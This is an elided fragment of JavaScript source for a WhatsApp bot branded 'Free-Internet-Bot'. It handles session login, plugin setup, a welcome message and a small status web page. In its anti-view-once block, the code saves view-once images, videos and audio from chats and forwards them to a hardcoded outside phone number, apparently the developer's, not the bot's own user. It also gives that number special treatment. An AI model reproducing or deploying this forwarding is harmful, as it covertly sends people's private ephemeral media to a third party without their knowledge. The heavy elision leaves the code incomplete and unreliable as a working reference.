...
const sessdata = config.SESSION_ID.replace("free~", '');
...
console.log("Session downloaded ✅")
  ...
  console.log("Connecting Free-Internet-Bot to WhatsApp ⏳️...");
  ...
  console.log('🧬 Installing Free-Internet-Bot Plugins')
  const path = require('path');
  ...
  let up = `*Hello there Free-Internet-Bot User! \ud83d\udc4b\ud83c\udffb* \n\n> This is auser friendly whatsapp bot created by Silva Tech Inc \ud83c\udf8a, Meet Free-Internet-Bot WhatsApp Bot.\n\n *Thanks for using Free-Internet-Bot \ud83d\udea9* \n\n> follow WhatsApp Channel :- 💖\n \nhttps://whatsapp.com/channel/0029VaAkETLLY6d8qhLmZt2v\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/SilvaTechB/silva-spark-md\n\n> © Powered BY Free-Internet-Bot \ud83d\udda4`;
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("255784766591@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("255784766591@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
  } if (jawadik.message.audioMessage) {
    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
    return conn.sendMessage("255784766591@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
  ...
  */
  ...
  if(senderNumber.includes("255784766591")){
  if(isReact) return
  m.react("🦄")
  }
...
if (!isReact && senderNumber === botNumber) {
  ...
  app.get("/", (req, res) => {
  res.send("Free-Internet-Bot RUNNING ✅");
  });
